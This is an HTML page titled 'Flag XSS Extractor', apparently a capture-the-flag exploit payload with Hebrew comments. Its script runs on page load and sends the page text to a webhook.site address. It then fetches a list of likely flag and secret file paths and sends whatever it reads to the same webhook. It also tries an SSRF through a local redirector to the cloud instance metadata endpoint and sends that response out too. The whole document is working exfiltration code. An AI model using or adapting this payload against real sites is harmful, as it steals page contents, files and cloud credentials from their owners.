<!DOCTYPE html>
<html>
<head><title>Flag XSS Extractor</title></head>
<body>
  <h1>JS Execution Test</h1>
  <p>✅ JS Executed</p>
  <script>
    // שולח את תוכן הדף ל־webhook
    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?body=' + encodeURIComponent(document.body.innerText));

    // נתיבים נפוצים לדגל
    const paths = [
      '/flag', '/flag.txt', '/secret', '/secret.txt',
      '/static/flag', '/hidden/flag.txt', '/home/ctf/flag', '/flag.html'
    ];

    // מנסה לקרוא את כל הנתיבים
    paths.forEach(path => {
      fetch(path)
        .then(r => r.text())
        .then(data => {
          fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?found=' + encodeURIComponent(path + ' => ' + data));
        })
        .catch(e => {});
    });

    // ניסיון דרך SSRF דרך redirector פנימי (אם קיים)
    fetch('http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/')
      .then(res => res.text())
      .then(data => {
        fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?ssrf=' + encodeURIComponent(data));
      })
      .catch(e => {});
  </script>
</body>
</html>
